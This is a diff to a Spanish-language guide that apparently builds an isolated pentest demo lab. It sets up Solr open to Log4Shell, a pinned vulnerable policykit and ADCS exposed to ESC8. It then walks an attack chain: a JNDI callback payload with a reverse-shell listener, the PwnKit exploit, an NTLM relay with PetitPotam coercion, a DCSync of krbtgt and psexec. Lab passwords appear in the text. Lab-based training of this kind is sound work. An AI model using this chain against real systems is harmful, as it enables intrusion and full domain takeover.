@@ -115,6 +115,25 @@ sudo ip addr add 10.10.0.66/24 dev vmnet1   # ajusta interfaz e IP a config/lab.
 ip -br a | grep 10.10.0.66                   # confirma
 ```
 
+   `10.10.0.1` es solo la IP que VMware pone por defecto en `vmnet1`; el
+   atacante va en `.66`, que es el valor de `lab.env` y del selftest.
+
+   Si el host tiene **ufw activo** (Parrot lo trae activo con `deny incoming`),
+   permite el tráfico del laboratorio: LDAP, HTTP del payload, probe, reverse
+   shell y relay SMB.
+
+```bash
+for p in 1389 8000 9998 4444 445; do
+  sudo ufw allow from 10.10.0.0/24 to any port "$p" proto tcp
+done
+```
+
+   Y para que `certipy` no dependa del DNS del host:
+
+```bash
+echo '10.10.0.30 DC01.corp.local corp.local' | sudo tee -a /etc/hosts
+```
+
 3. Preflight y contrato:
 
 ```bash
@@ -143,7 +162,19 @@ bash provision/attacker-tools.sh
 sudo nessuscli managed link --key=<KEY> --cloud
 ```
 
-5. Política: *Policies → New Policy → Basic Network Scan*, nombre **`Bifrost-Demo`**, con **Credentials** SSH (`bifrost` + sudo) y Windows (`CORP\Administrator`, SMB + WMI), y Plugins → Web Servers activado.
+5. Política: *Policies → New Policy → Basic Network Scan*, nombre **`Bifrost-Demo`**:
+   - **Credentials → SSH**: usuario `bifrost`, su contraseña y `sudo` a `root`
+     (la cuenta usa `NOPASSWD`; el sudo password puede quedar vacío). Para el
+     escaneo credenciado de Linux hay que abrir el 22 temporalmente (ver paso 2);
+     el Log4Shell se detecta igual sin credenciales.
+   - **Credentials → Windows**: usuario `Administrator`, **Domain `CORP`**,
+     contraseña `Bifrost-Admin-2026!`, **SMB + WMI**. No uses
+     `CORP\Administrator` con Domain vacío: el `smb_login` de Nessus falla.
+     Marca además *Start the Remote Registry service during the scan* y
+     *Enable administrative shares during the scan*.
+   - **Plugins**: se habilitan por **familias** (no plugin a plugin). Deja
+     **Web Servers** (Log4Shell/Solr), **Ubuntu Local Security Checks** y las de
+     **Windows**; puedes desactivar las familias que no aplican para acelerar.
 6. API keys: *Settings → My Account → API Keys → Generate*, guárdalas en `~/.bifrost/tenable.json`.
 
 **Gate 1** (en `host`):
@@ -184,6 +215,41 @@ durante la construcción.
 bash provision/apply.sh web01
 ```
 
+4. **PwnKit (puente 2)**. Aunque `policykit` sea viejo, hay dos trampas:
+
+   - **Versión de policykit**: si `dpkg -s policykit-1` da `0.105-26ubuntu1.2`
+     o superior (pasa si se aplicaron actualizaciones), baja a la del release y
+     bloquéala:
+     ```bash
+     sudo apt-get install --allow-downgrades policykit-1=0.105-26ubuntu1 \
+       libpolkit-agent-1-0=0.105-26ubuntu1 libpolkit-gobject-1-0=0.105-26ubuntu1
+     sudo apt-mark hold policykit-1 libpolkit-agent-1-0 libpolkit-gobject-1-0
+     ```
+   - **Kernel**: PwnKit necesita `argc=0`. Desde 5.4.197 el kernel fuerza un
+     `argv[0]` vacío (mitigación *argv=0*) y en 20.04 eso llega con los kernels
+     actualizados (`5.4.0-124`+). Si `uname -r` no es el del release
+     (`5.4.0-26`), arráncalo desde GRUB → *Advanced options* o reinstala sin
+     actualizar. Sin esto, el exploit imprime el `usage` de pkexec aunque
+     `policykit` sea vulnerable. `web01-solr.sh` ya avisa de ambas cosas.
+
+5. **SSH tras el provisioning**: `web01-solr.sh` deja ufw con solo el 8983, así
+   que `apply.sh`/`ssh` desde el host dan timeout. Usa la consola de VMware; si
+   necesitas SSH para depurar o para un escaneo credenciado:
+   ```bash
+   sudo ufw allow from 10.10.0.0/24 to any port 22 proto tcp
+   ```
+   quítalo antes del snapshot/demo.
+
+6. **PwnKit sin internet** (la NAT se retira en el paso 6): deja el exploit
+   compilado dentro de la VM.
+   ```bash
+   sudo apt-get install -y build-essential git
+   sudo git clone https://github.com/berdav/CVE-2021-4034 /opt/pk
+   sudo make -C /opt/pk
+   ```
+   En la demo, desde la shell de `solr`: `su svc_app` y
+   `cd /opt/pk && ./cve-2021-4034`.
+
 **Gate 2** (en `host`):
 
 ```bash
@@ -204,37 +270,79 @@ cd exploits/log4shell && ./build.sh && ./selftest.sh
 
 1. VM Windows Server 2019, red VMnet1, 60 GB. Instala VMware Tools.
 2. Copia `config\` y `windows\` a `C:\Bifrost\`.
-3. Dos pasadas (reiniciando):
+3. Secuencia real (el script es multi-fase; relanza tras cada reinicio):
 
 ```powershell
-.\dc01-promote.ps1    # fase 1 -> reinicia
-.\dc01-promote.ps1    # fase 2
-.\adcs-esc8.ps1       # ADCS con ESC8
+.\dc01-promote.ps1    # red + rename -> reinicia
+.\dc01-promote.ps1    # AD DS + promocion -> reinicia
+.\dc01-promote.ps1    # OU/usuarios/corona -> "dc01 listo"
+
+.\adcs-esc8.ps1       # si pide reinicio, reinicia y repite
+Get-Service CertSvc   # Running
+Install-AdcsWebEnrollment -Force   # el script puede saltarselo (nota)
+.\adcs-esc8.ps1       # anon OFF / NTLM ON / SSL OFF
 ```
+
+> El chequeo de Web Enrollment del script original miraba
+> `C:\Windows\System32\CertSrv\CertEnroll`, carpeta que crea el propio CA;
+> ahora comprueba la aplicación `/CertSrv` en IIS. Si el role quedó a medias y
+> responde «already installed», ejecuta `Uninstall-AdcsWebEnrollment -Force` y
+> vuelve a lanzar. El `RestartNeeded` de las features es normal: reinicia.
 
 **Gate 4** (en `dc01`):
 
 ```powershell
 Get-ADDomain | Select-Object Name                    # corp.local
+Get-Service CertSvc                                  # Running
+Get-WebApplication -Site 'Default Web Site'          # /CertSrv
 Invoke-WebRequest http://localhost/certsrv/ -UseBasicParsing
-# 401 = correcto: existe, pide NTLM, NO exige TLS
+# 401 (o 401.2) = correcto: existe, pide NTLM, NO exige TLS
+certutil -CATemplates | Select-String DomainController
+Test-Path C:\Corp\Finanzas                           # en la misma ventana elevada
 ```
+
+El `Auto-Enroll: Access is denied` de `certutil` es el permiso de
+auto-inscripción del usuario actual, no la disponibilidad de la plantilla.
 
 ### Paso 4 — ws01
 
 **En:** `VMware GUI` + consola de `ws01`.
 
-1. VM Windows 10, red VMnet1, DNS = `BIFROST_IP_DC`.
-2. Copia `config\` y `windows\` a `C:\Bifrost\` y ejecuta:
+1. VM Windows 10 **Pro** (Home no puede unirse a un dominio), 2 vCPU / 4 GB /
+   60 GB, **una sola NIC: VMnet1**, VMware Tools. Si el OOBE exige red,
+   `Shift+F10` → `OOBE\BYPASSNRO` y cuenta local. Si usas una NAT para instalar,
+   **desconéctala** antes del script: el script elige el primer adaptador `Up`.
+2. Copia `config\` y `windows\` a `C:\Bifrost\` y prepara la sesión:
 
 ```powershell
-.\ws01-join.ps1     # reinicia y relanzar si pide union
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+Get-ChildItem C:\Bifrost -Recurse -File | Unblock-File
 ```
+
+3. Red y hora: el script pone `10.10.0.31/24`, DNS `10.10.0.30` y el gateway
+   nominal. Comprueba `Resolve-DnsName corp.local` y arranca el reloj
+   (`Start-Service w32time; w32tm /config /syncfromflags:domhier /update`).
+4. Ejecuta y relanza tras cada reinicio (rename → join → seed) hasta
+   `ws01 listo`:
+
+```powershell
+.\ws01-join.ps1
+```
+
+   El script ya quita la ruta por defecto antes de recrear el gateway
+   (evita `Instance DefaultGateway already exists`). Para el login de dominio,
+   en la pantalla de inicio usa **Otro usuario** → `CORP\Administrator` /
+   `Bifrost-Admin-2026!`; para la siembra vale la cuenta local.
+
+   El share se crea con el SID de Everyone (funciona también en Windows en
+   español, «Todos») y el script abre el 445. Si el SMB no responde:
+   `New-NetFirewallRule -DisplayName 'Bifrost SMB-In' -Direction Inbound -Protocol TCP -LocalPort 445 -Action Allow`.
 
 **Gate 5** (en `ws01`, luego `host`):
 
 ```powershell
 (Get-CimInstance Win32_ComputerSystem).Domain    # corp.local
+Get-SmbShare -Name Compartido
 ```
 
 ```bash
@@ -243,25 +351,47 @@ source ~/bifrost/env.sh
 nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --shares
 ```
 
+> `svc_backup` es usuario de dominio, **no** admin local de ws01: `--lsa` y
+> `evil-winrm` con esa cuenta no funcionan (la guía los marca «si hay admin
+> local»). El puente 3 es la lectura del share y los señuelos de `IT\`.
+
 ### Paso 5 — Prueba de humo del escaneo
 
-**En:** `host`.
+**En:** `host` (API) o `Tenable UI` (visual).
 
 ```bash
 python tenable/tenable_scan.py --action run --name "Bifrost smoke" --out out/smoke.nessus
 ```
 
-**Gate 6:** termina `completed` y `out/smoke.md` tiene un **Crítico** en `BIFROST_IP_WEB` (Log4Shell).
+**Alternativa por UI (sin API keys):** `cloud.tenable.com` → **Scans → New
+Scan** → política `Bifrost-Demo` → targets `10.10.0.20,10.10.0.30,10.10.0.31`
+→ scanner `10.10.0.10` → **Launch**. Al terminar, **Export → Nessus**.
+
+**Gate 6:** termina `completed` y el resumen tiene un **Crítico** en
+`BIFROST_IP_WEB` (Log4Shell, plugins 155999/156057; el 168496 es el RCE de
+Solr en 8983).
+
+Si exportas desde la UI, Tenable puede partir cada host en varios `ReportHost`
+(bloques de ~100 hallazgos). El resumen offline los une:
+
+```bash
+python tenable/tenable_scan.py --action summary --file out/Bifrost_Smoke.nessus --out out/smoke.md
+```
 
 ### Paso 6 — Snapshots y ensayo
 
-1. **Retira la NIC NAT** de `web01` (en `VMware GUI`).
-2. Snapshots (en `host`):
+1. **Retira la NIC NAT** de `web01` y el 22 temporal si lo abriste. Comprueba
+   que `ip -br a` solo tiene `10.10.0.20` y que `sudo ufw status` solo deja
+   8983.
+2. Apaga las VMs y toma los snapshots (el comando acepta la etiqueta):
 
 ```bash
+./bifrost.sh stop all
 ./bifrost.sh snapshot all clean
-./bifrost.sh snapshot all pre-demo
+./bifrost.sh snapshot all pre-demo    # después del ensayo
 ```
+
+`pre-demo` es el que usa `reset`; no lo olvides.
 
 **Gate final:** `./bifrost.sh reset all` deja todo idéntico a `pre-demo` en <60 s.
 
@@ -282,8 +412,8 @@ cd exploits/log4shell
 # terminal 2: listener
 nc -lvnp "$BIFROST_REVSHELL_PORT"
 
-# terminal 3: el disparo
-curl "http://$TARGET_WEB:$BIFROST_SOLR_PORT/solr/admin/cores?action=\${jndi:ldap://$LHOST:$BIFROST_LDAP_PORT/Exploit}"
+# terminal 3: el disparo (-g: si no, curl se come las llaves de ${...})
+curl -g "http://$TARGET_WEB:$BIFROST_SOLR_PORT/solr/admin/cores?action=\${jndi:ldap://$LHOST:$BIFROST_LDAP_PORT/Exploit}"
 ```
 
 En la shell recibida (usuario `solr` en `web01`): `id`, `hostname`.
@@ -293,12 +423,16 @@ En la shell recibida (usuario `solr` en `web01`): `id`, `hostname`.
 En la shell de `web01`:
 
 ```bash
-cat /opt/solr/server/solr/intranet/conf/db.properties    # -> svc_app / password
-su svc_app                                               # usa esa password
-# PwnKit
-git clone https://github.com/berdav/CVE-2021-4034 /tmp/pk && cd /tmp/pk && make && ./cve-2021-4034
+cat /opt/solr/server/solr/intranet/conf/db.properties    # -> svc_app / Bifrost2026!
+su svc_app
+cd /opt/pk && ./cve-2021-4034                           # precompilado, sin internet
 id                                                       # uid=0(root)
 ```
+
+Si no precompilaste `/opt/pk` (paso 2) y la VM todavía tiene red:
+`git clone https://github.com/berdav/CVE-2021-4034 /tmp/pk && cd /tmp/pk && make && ./cve-2021-4034`.
+El kernel debe ser el `5.4.0-26` (ver paso 2); con el `5.4.0-124`+ el `argc=0`
+está mitigado y PwnKit imprime el `usage` de pkexec.
 
 ### Puente 3 — Lateral (ws01)
 
@@ -312,22 +446,28 @@ De vuelta en el **host**:
 
 ```bash
 nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --shares
-nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --lsa
-evil-winrm -i "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"   # si hay admin local
+nxc smb "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" --lsa   # requiere admin local
+evil-winrm -i "$TARGET_WS" -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS"   # si svc_backup fuera admin
 ```
+
+> `svc_backup` no es admin local de ws01; el valor del puente 3 es la lectura
+> del share `Compartido` y sus señuelos.
 
 ### Puente 4 — ESC8 → Domain Admin
 
 ```bash
-# terminal 1: relay
+# terminal 1: relay. En Parrot el binario es impacket-ntlmrelayx; el script
+# attacker-tools.sh deja también ntlmrelayx.py y abre el 445 en ufw.
 ntlmrelayx.py -t "http://$TARGET_DC/certsrv/certfnsh.asp" \
-  -smb2support --adcs --template DomainController --output-folder ~/bifrost/loot
+  -smb2support --adcs --template DomainController -l ~/bifrost/loot
 
-# terminal 2: coaccion
+# terminal 2: coacción (PetitPotam no viene en impacket; lo clona attacker-tools.sh)
 PetitPotam.py -u "$BIFROST_SVC_USER" -p "$BIFROST_SVC_PASS" -d "$BIFROST_DOMAIN" "$LHOST" "$TARGET_DC"
 
-# terminal 3: certificado -> hash
-certipy auth -pfx ~/bifrost/loot/DC01.pfx -dc-ip "$TARGET_DC"
+# terminal 3: certificado -> hash (el PFX suele ser DC01$.pfx)
+certipy auth -pfx ~/bifrost/loot/DC01\$.pfx -dc-ip "$TARGET_DC"
+# para enumerar: certipy find -u "$BIFROST_SVC_USER@$BIFROST_DOMAIN" -p "$BIFROST_SVC_PASS" \
+#   -dc-ip "$TARGET_DC" -ldap-scheme ldap -vulnerable
 
 # DCSync
 secretsdump.py -just-dc-user krbtgt "$BIFROST_DOMAIN/DC01\$"@"$TARGET_DC" -hashes :<HASH>
@@ -336,6 +476,10 @@ secretsdump.py -just-dc-user krbtgt "$BIFROST_DOMAIN/DC01\$"@"$TARGET_DC" -hashe
 psexec.py -k -no-pass "$BIFROST_DOMAIN/Administrator@$TARGET_DC"
 dir C:\Corp\Finanzas
 ```
+
+> El relay escucha en **445/tcp**: si el ufw del host está activo debe permitir
+> `from 10.10.0.0/24 to any port 445 proto tcp` (lo hace `attacker-tools.sh`).
+> `--output-folder` no existe en impacket 0.12: el loot se guarda con `-l`.
 
 ---
 
@@ -379,12 +523,25 @@ siempre funciona a la primera. Se cambia de técnica y se sigue."*
 | Dónde | Síntoma | Causa probable | Arreglo |
 |---|---|---|---|
 | `host` | preflight `bloqueante` por red | no hay vmnet | crear VMnet1 host-only |
-| `host` | `apply.sh` no conecta | VM apagada / IP mal | `./bifrost.sh ip web01` |
+| `host` | `apply.sh` no conecta | VM apagada / IP mal / ufw de web01 | `./bifrost.sh ip web01`; ver fila de SSH |
 | `web01` | `web01-solr.sh` "sin internet" | falta NIC NAT de construcción | activarla, reejecutar |
-| `host` | `selftest.sh` FALLO | trustURLCodebase o ruta | el script imprime 4 pasos |
+| `web01` | `ssh`/`apply.sh` a web01 dan timeout | web01 ufw solo deja 8983 | consola de VMware o `ufw allow ... 22` temporal |
+| `host` | `selftest.sh` FALLO sin conexión LDAP | `curl` sin `-g` se come las llaves de `${jndi:...}` | ya corregido en `selftest.sh`/`ldap-serve.sh`/GUIDE |
+| `web01` | PwnKit imprime el `usage` de pkexec | kernel con mitigación *argv=0* (≥5.4.0-124) | arrancar el `5.4.0-26` desde GRUB |
+| `web01` | `policykit-1` ≥ 0.105-26ubuntu1.2 | actualizaciones aplicadas | downgrade a `0.105-26ubuntu1` + `apt-mark hold` |
+| `dc01` | `adcs-esc8.ps1` repite «Se requiere reinicio» | features pendientes de reboot | reiniciar y relanzar |
+| `dc01` | `/certsrv/` da 404 tras el CA | el script se saltaba Web Enrollment (`CertEnroll`) | `Install-AdcsWebEnrollment -Force` (script corregido) |
+| `dc01` | `Install-AdcsWebEnrollment` «already installed» | role a medias | `Uninstall-AdcsWebEnrollment -Force` e instalar |
+| `ws01` | `New-NetIPAddress ... DefaultGateway already exists` | ruta por defecto de una pasada anterior | script corregido; o `Remove-NetRoute ... 0.0.0.0/0` |
+| `ws01` | `Add-Computer` «domain does not exist» | DNS/hora o NAT arriba | `Resolve-DnsName corp.local`; solo VMnet1; `w32time` |
+| `ws01` | la siembra falla con `Everyone` | Windows en español («Todos») | el script usa el SID; a mano, SID/Todos |
+| `ws01` | `nxc smb` no conecta | firewall 445 | `New-NetFirewallRule ... -LocalPort 445` |
 | `scanner` | `disconnected` | NIC NAT del scanner caída | `curl https://cloud.tenable.com` |
-| `host` | escaneo sin Crítico | política sin credenciales/plugins | revisar política |
-| `host` | relay no recibe | `certsrv` redirige a HTTPS | repetir `adcs-esc8.ps1` §4 |
+| `scanner` | credenciales Windows inválidas (104410) | `CORP\Administrator` con Domain vacío | usuario `Administrator`, domain `CORP`; Remote Registry/admin shares |
+| `host` | escaneo sin Crítico | política sin credenciales/plugins | revisar política y familia Web Servers |
+| `host` | relay no recibe | `certsrv` redirige a HTTPS o falta el 445 | repetir `adcs-esc8.ps1` §4; `ufw allow ... 445` |
+| `host` | `ntlmrelayx.py`/`PetitPotam.py` no existen | impacket usa `impacket-*`; PetitPotam no viene | `attacker-tools.sh` crea symlinks/clona |
+| `host` | `certipy find` da timeout/SSL reset | LDAPS por defecto o DNS del DC | `-ldap-scheme ldap`; `/etc/hosts` con `DC01.corp.local` |
 | `dc01`/`ws01` | Kerberos falla | reloj desincronizado | `w32tm /resync` |
 
 ---
